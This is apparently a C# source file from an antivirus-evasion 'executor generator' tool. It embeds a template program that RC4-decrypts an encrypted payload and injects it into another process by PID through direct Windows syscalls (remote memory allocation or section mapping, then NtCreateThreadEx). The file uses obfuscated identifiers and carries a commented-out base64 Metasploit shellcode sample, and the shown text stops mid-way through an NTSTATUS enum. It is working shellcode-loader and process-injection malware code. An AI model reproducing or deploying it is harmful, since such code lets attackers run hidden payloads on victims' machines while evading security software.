using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    class TP_Syscall_Exist
    {
        string code;

        public TP_Syscall_Exist(String decKey, String encPayload, int pid)
        {
            code = @"using System;
using System.Runtime.InteropServices;
using System.Security;
using System.ComponentModel;
using System.Diagnostics;
using System.Collections;
using System.Collections.Generic;
using System.Deployment.Internal;
using System.Linq;
using System.Text;

namespace CS_SysCall
{
    class Program
    {
        public const int ALLOCWRITE = 1;
        public const int OPENSEC = 2;

        static unsafe void Main(string[] args)
        {
            string xxxx = """ + encPayload + @""";
            string osV = getOsVers();
            string[] xxxx_Without_delimiterChar = xxxx.Split(',');
            byte[] _X_to_Bytes = new byte[xxxx_Without_delimiterChar.Length];
            for (int i = 0; i < xxxx_Without_delimiterChar.Length; i++)
            {
                byte current = Convert.ToByte(xxxx_Without_delimiterChar[i].ToString());
                _X_to_Bytes[i] = current;
            }
            byte[] KEY = { " + decKey + @" };
            byte[] yr_var_foobar_3_ccx = xxxxxx(KEY, _X_to_Bytes);

            yr_var_foobar_2_ccx(osV, OPENSEC, " + pid + @", yr_var_foobar_3_ccx);
            //Console.WriteLine(""[+] Injection done. Press any key to exit"");
            //Console.ReadKey();
        }
        public static byte[] xxxxxx(byte[] key, byte[] data)
        {
            return xxxxxxx(key, data).ToArray();
        }

        private static byte[] sDZi32(byte[] key)
        {
            byte[] s = Enumerable.Range(0, 256)
                .Select(i => (byte)i)
                .ToArray();

            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + key[i % key.Length] + s[i]) & 255;

                xxx(s, i, j);
            }

            return s;
        }
        private static IEnumerable<byte> xxxxxxx(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = sDZi32(key);

            int i = 0;
            int j = 0;

            return data.Select((b) =>
            {
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;

                xxx(s, i, j);

                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }
        private static void xxx(byte[] s, int i, int j)
        {
            byte c = s[i];

            s[i] = s[j];
            s[j] = c;
        }

        public static string getOsVers()
        {
            nativeStructs.OSVERSIONINFOEXW osInfo = new nativeStructs.OSVERSIONINFOEXW();
            osInfo.dwOSVersionInfoSize = Marshal.SizeOf(osInfo);
            nativeStructs.RtlGetVersion(ref osInfo);
            string osV = """";

            switch (osInfo.dwMajorVersion)
            {
                case 10:
                    switch (osInfo.dwBuildNumber)
                    {
                        case 10240:
                            osV = ""win10-1507"";
                            break;
                        case 10586:
                            osV = ""win10-1511"";
                            break;
                        case 14393:
                            osV = ""win10-1607"";
                            break;
                        case 15063:
                            osV = ""win10-1703"";
                            break;
                        case 16299:
                            osV = ""win10-1709"";
                            break;
                        case 17134:
                            osV = ""win10-1803"";
                            break;
                        case 17763:
                            osV = ""win10-1809"";
                            break;
                        case 18362:
                            osV = ""win10-1903-9"";
                            break;
                    }
                    break;
                case 6:
                    switch (osInfo.dwMinorVersion)
                    {
                        case 1:
                            osV = ""w7-08"";
                            break;
                        case 2:
                            osV = ""win8-12"";
                            break;
                        case 3:
                            osV = ""win8.1-12r2"";
                            break;
                    }
                    break;
                default:
                    osV = """";
                    break;
            }
            return osV;
        }

        public static unsafe int yr_var_foobar_2_ccx(string os, int method, int pid, byte[] yr_var_foobar_1_ccx)
        {

            //Process targetProcess = Process.GetProcessesByName(processName)[0];

            //int id = targetProcess.Id;
            int id = pid;
            //Console.WriteLine(""Injecting yr_var_foobar_1_ccx on pid "" + id);

            //msf messagebox x64
            //string s = @""/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYD5Ii1IYPkiLUiA+SItyUD5ID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVE+SItSID6LQjxIAdA+i4CIAAAASIXAdG9IAdBQPotIGD5Ei0AgSQHQ41xI/8k+QYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18T5MA0wkCEU50XXWWD5Ei0AkSQHQZj5BiwxIPkSLQBxJAdA+QYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVo+SIsS6Un///9dScfBAAAAAD5IjZX+AAAAPkyNhQMBAABIMclBukWDVgf/1UgxyUG68LWiVv/VZ2F0bwBNZXNzYWdlQm94AA=="";
            //byte[] yr_var_foobar_1_ccx = Convert.FromBase64String(s);
            


            nativeStructs.CLIENT_ID clientid = new nativeStructs.CLIENT_ID();
            clientid.UniqueProcess = new IntPtr(id);
            clientid.UniqueThread = IntPtr.Zero;

            IntPtr bufferReal = IntPtr.Zero;
            IntPtr procHandle = IntPtr.Zero;
            syscalls.ZwOpenProcess(ref procHandle, nativeStructs.ProcessAccessFlags.All, new nativeStructs.OBJECT_ATTRIBUTES(), ref clientid, os);
            IntPtr remoteAddr = new IntPtr();

            switch (method)
            {
                case ALLOCWRITE:
                    //Console.WriteLine(""[+] Using ALLOCWRITE method to allocate our yr_var_foobar_1_ccx in the remote process"");
                    UIntPtr sz = new UIntPtr(Convert.ToUInt32(yr_var_foobar_1_ccx.Length));

                    syscalls.NtAllocateVirtualMemory(procHandle, ref remoteAddr, new IntPtr(0), ref sz, nativeStructs.MEM_COMMIT | nativeStructs.MEM_RESERVE, nativeStructs.PAGE_EXECUTE_READWRITE, os);

                    IntPtr written = IntPtr.Zero;
                    IntPtr unmanagedPointer = Marshal.AllocHGlobal(yr_var_foobar_1_ccx.Length);
                    Marshal.Copy(yr_var_foobar_1_ccx, 0, unmanagedPointer, yr_var_foobar_1_ccx.Length);
                    syscalls.ZwWriteVirtualMemory(procHandle, ref remoteAddr, unmanagedPointer, Convert.ToUInt32(yr_var_foobar_1_ccx.Length), ref written, os);

                    break;
                case OPENSEC:
                    //Console.WriteLine(""[+] Using OPENSEC method to allocate our yr_var_foobar_1_ccx in the remote process"");
                    //create required structs/variables
                    IntPtr localAddr = new IntPtr(null);
                    Process thisProc = Process.GetCurrentProcess();
                    nativeStructs.LARGE_INTEGER liVal = new nativeStructs.LARGE_INTEGER();
                    uint size_ = getLowPart((uint)yr_var_foobar_1_ccx.Length);
                    liVal.LowPart = size_;

                    //create local section
                    IntPtr section_ = new IntPtr();
                    IntPtr viewSize = (IntPtr)(yr_var_foobar_1_ccx.Length);
                    long status = (int)syscalls.NtCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, nativeStructs.PAGE_EXECUTE_READWRITE, 0x08000000, (IntPtr)0, os);

                    //map local section
                    status = (int)syscalls.NtMapViewOfSection(section_, thisProc.Handle, ref localAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, nativeStructs.PAGE_EXECUTE_READWRITE, os);

                    //map remote section
                    status = (int)syscalls.NtMapViewOfSection(section_, procHandle, ref remoteAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, nativeStructs.PAGE_EXECUTE_READWRITE, os);

                    //copy yr_var_foobar_1_ccx to local section
                    Marshal.Copy(yr_var_foobar_1_ccx, 0, localAddr, yr_var_foobar_1_ccx.Length);

                    break;
            }



            //bool is64bit = Environment.Is64BitProcess;
            int temp1 = 0, temp2 = 0;
            nativeStructs.NtCreateThreadExBuffer nb = new nativeStructs.NtCreateThreadExBuffer
            {
                Size = sizeof(nativeStructs.NtCreateThreadExBuffer),
                Unknown1 = 0x10003,
                Unknown2 = 0x8,
                Unknown3 = new IntPtr(&temp2),
                Unknown4 = 0,
                Unknown5 = 0x10004,
                Unknown6 = 4,
                Unknown7 = new IntPtr(&temp1),
                Unknown8 = 0,
            };
            IntPtr hRemoteThread;
            //syscalls.NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, procHandle, buffer, IntPtr.Zero, 0, 0, (is64bit ? 0xFFFF : 0u), (is64bit ? 0xFFFF : 0u), (is64bit ? IntPtr.Zero : new IntPtr(&nb)), os);
            //if OPENSEC then a thread is created in a remote process with the remote section addr as starting point. 
            //if ALLOCWRITE then a thread is created poiting to a memory address with our yr_var_foobar_1_ccx
            syscalls.NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, procHandle, remoteAddr, IntPtr.Zero, 0, 0, 0xFFFF, 0xFFFF, IntPtr.Zero, os);

            return 0;
        }

        public static uint getLowPart(uint size)
        {
            nativeStructs.SYSTEM_INFO info = new nativeStructs.SYSTEM_INFO();
            nativeStructs.GetSystemInfo(ref info);
            return (info.dwPageSize - size % info.dwPageSize) + size;
        }
    }
    class nativeStructs
    {

        public const uint MEM_COMMIT = 0x00001000;
        public const uint MEM_RESERVE = 0x00002000;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        public const int FILE_READ_DATA = 0x0001;     // file & pipe
        public const int FILE_LIST_DIRECTORY = 0x0001;     // directory
        public const int FILE_WRITE_DATA = 0x0002;     // file & pipe
        public const int FILE_ADD_FILE = 0x0002;     // directory
        public const int FILE_APPEND_DATA = 0x0004;     // file
        public const int FILE_ADD_SUBDIRECTORY = 0x0004;     // directory
        public const int FILE_CREATE_PIPE_INSTANCE = 0x0004;     // named pipe
        public const int FILE_READ_EA = 0x0008;     // file & directory
        public const int FILE_WRITE_EA = 0x0010;     // file & directory
        public const int FILE_EXECUTE = 0x0020;     // file
        public const int FILE_TRAVERSE = 0x0020;     // directory
        public const int FILE_DELETE_CHILD = 0x0040;     // directory
        public const int FILE_READ_ATTRIBUTES = 0x0080;     // all
        public const int FILE_WRITE_ATTRIBUTES = 0x0100;     // all
        public const int FILE_OVERWRITE_IF = 0x00000005;
        public const int FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020;

        public const long READ_CONTROL = 0x00020000;
        public const long SYNCHRONIZE = 0x00100000;
        public const long STANDARD_RIGHTS_WRITE = READ_CONTROL;
        public const long STANDARD_RIGHTS_EXECUTE = READ_CONTROL;
        public const long STANDARD_RIGHTS_ALL = 0x001F0000;

        public const long SPECIFIC_RIGHTS_ALL = 0x0000FFFF;
        public const long FILE_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1FF;

        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);
        public const UInt32 TOKEN_ALT = (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY);

        public const UInt32 SE_PRIVILEGE_ENABLED = 0x2;

        public const long FILE_GENERIC_READ = STANDARD_RIGHTS_READ |
          FILE_READ_DATA |
          FILE_READ_ATTRIBUTES |
          FILE_READ_EA |
          SYNCHRONIZE;

        public const long FILE_GENERIC_WRITE = STANDARD_RIGHTS_WRITE |
          FILE_WRITE_DATA |
          FILE_WRITE_ATTRIBUTES |
          FILE_WRITE_EA |
          FILE_APPEND_DATA |
          SYNCHRONIZE;

        public const long FILE_GENERIC_EXECUTE = STANDARD_RIGHTS_EXECUTE |
          FILE_READ_ATTRIBUTES |
          FILE_EXECUTE |
          SYNCHRONIZE;

        public const int FILE_SHARE_READ = 0x00000001;
        public const int FILE_SHARE_WRITE = 0x00000002;
        public const int FILE_SHARE_DELETE = 0x00000004;
        public const int FILE_ATTRIBUTE_READONLY = 0x00000001;
        public const int FILE_ATTRIBUTE_HIDDEN = 0x00000002;
        public const int FILE_ATTRIBUTE_SYSTEM = 0x00000004;
        public const int FILE_ATTRIBUTE_DIRECTORY = 0x00000010;
        public const int FILE_ATTRIBUTE_ARCHIVE = 0x00000020;
        public const int FILE_ATTRIBUTE_DEVICE = 0x00000040;
        public const int FILE_ATTRIBUTE_NORMAL = 0x00000080;
        public const int FILE_ATTRIBUTE_TEMPORARY = 0x00000100;
        public const int FILE_ATTRIBUTE_SPARSE_FILE = 0x00000200;
        public const int FILE_ATTRIBUTE_REPARSE_POINT = 0x00000400;
        public const int FILE_ATTRIBUTE_COMPRESSED = 0x00000800;
        public const int FILE_ATTRIBUTE_OFFLINE = 0x00001000;
        public const int FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = 0x00002000;
        public const int FILE_ATTRIBUTE_ENCRYPTED = 0x00004000;
        public const int FILE_NOTIFY_CHANGE_FILE_NAME = 0x00000001;
        public const int FILE_NOTIFY_CHANGE_DIR_NAME = 0x00000002;
        public const int FILE_NOTIFY_CHANGE_ATTRIBUTES = 0x00000004;
        public const int FILE_NOTIFY_CHANGE_SIZE = 0x00000008;
        public const int FILE_NOTIFY_CHANGE_LAST_WRITE = 0x00000010;
        public const int FILE_NOTIFY_CHANGE_LAST_ACCESS = 0x00000020;
        public const int FILE_NOTIFY_CHANGE_CREATION = 0x00000040;
        public const int FILE_NOTIFY_CHANGE_SECURITY = 0x00000100;
        public const int FILE_ACTION_ADDED = 0x00000001;
        public const int FILE_ACTION_REMOVED = 0x00000002;
        public const int FILE_ACTION_MODIFIED = 0x00000003;
        public const int FILE_ACTION_RENAMED_OLD_NAME = 0x00000004;
        public const int FILE_ACTION_RENAMED_NEW_NAME = 0x00000005;
        public const int MAILSLOT_NO_MESSAGE = -1;
        public const int MAILSLOT_WAIT_FOREVER = -1;
        public const int FILE_CASE_SENSITIVE_SEARCH = 0x00000001;
        public const int FILE_CASE_PRESERVED_NAMES = 0x00000002;
        public const int FILE_UNICODE_ON_DISK = 0x00000004;
        public const int FILE_PERSISTENT_ACLS = 0x00000008;
        public const int FILE_FILE_COMPRESSION = 0x00000010;
        public const int FILE_VOLUME_QUOTAS = 0x00000020;
        public const int FILE_SUPPORTS_SPARSE_FILES = 0x00000040;
        public const int FILE_SUPPORTS_REPARSE_POINTS = 0x00000080;
        public const int FILE_SUPPORTS_REMOTE_STORAGE = 0x00000100;
        public const int FILE_VOLUME_IS_COMPRESSED = 0x00008000;
        public const int FILE_SUPPORTS_OBJECT_IDS = 0x00010000;
        public const int FILE_SUPPORTS_ENCRYPTION = 0x00020000;
        public const int FILE_NAMED_STREAMS = 0x00040000;
        public const int FILE_READ_ONLY_VOLUME = 0x00080000;
        public const int CREATE_ALWAYS = 2;

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct NtCreateThreadExBuffer
        {
            public int Size;
            public uint Unknown1;
            public uint Unknown2;
            public IntPtr Unknown3;
            public uint Unknown4;
            public uint Unknown5;
            public uint Unknown6;
            public IntPtr Unknown7;
            public uint Unknown8;
        };

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct OSVERSIONINFOEXW
        {
            public int dwOSVersionInfoSize;
            public int dwMajorVersion;
            public int dwMinorVersion;
            public int dwBuildNumber;
            public int dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;
            public UInt16 wServicePackMajor;
            public UInt16 wServicePackMinor;
            public UInt16 wSuiteMask;
            public byte wProductType;
            public byte wReserved;
        }



        [StructLayout(LayoutKind.Sequential)]
        public struct LARGE_INTEGER
        {
            public UInt32 LowPart;
            public UInt32 HighPart;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }


        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public ulong Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public ulong Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            ConflictingAddresses = 0xc0000018,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
